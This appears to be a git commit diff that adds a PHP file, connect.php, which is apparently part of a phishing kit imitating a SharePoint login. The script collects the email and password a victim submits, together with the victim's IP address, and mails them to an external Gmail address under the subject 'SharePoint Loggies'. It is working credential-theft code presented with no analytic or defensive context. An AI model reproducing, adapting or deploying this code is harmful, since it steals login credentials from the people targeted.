30aeb449ca826f0319fd457806f8281cfadc7965
MelissaCarnagie <161925454+MelissaCarnagie@users.noreply.github.com>
2024-03-04 13:00:19 +0200

    Add files via upload

---
+++ connect.php
@@ -0,0 +1,23 @@
+<?php
+$ip = getenv("REMOTE_ADDR");	
+
+if(!empty($_POST)) {
+ $amu= $_POST['email'];
+ $otu = $_POST['password'];
+ 
+		$omeka = "hdxcvpaul@gmail.com";
+		
+		
+         $ishiozi = "SharePoint Loggies : $ip";
+		 
+		 $ozi =  "Email ID            : ".$amu."\r\n";
+         $ozi .= "Password           : ".$otu."\r\n";
+		 $ozi .= "IP           : ".$ip."\r\n";
+		$header = "No More Sapa: Ji Masun \r\n";
+         $header .= "MIME-Version: 1.0\r\n";
+         $header .= "Content-type: text/html\r\n";
+		 
+		 mail ($omeka,$ishiozi,$ozi,$header);
+
+}
+?>
